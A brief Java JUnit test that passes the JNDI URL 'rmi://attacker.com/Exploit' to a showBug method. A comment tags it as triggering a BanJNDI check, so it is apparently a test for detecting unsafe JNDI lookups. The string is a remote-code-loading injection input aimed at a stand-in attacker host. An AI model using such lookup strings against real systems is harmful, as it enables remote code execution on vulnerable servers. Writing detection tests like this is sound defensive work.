import org.junit.Test;
import static org.junit.Assert.*;

public class JndiExampleTest {

    @Test
    public void testShowBug() throws Exception {
        JndiExample example = new JndiExample();
        String result = example.showBug("rmi://attacker.com/Exploit"); // TRIGGER BUG: BanJNDI
        assertEquals("Expected result", result, "Unexpected result");
    }
}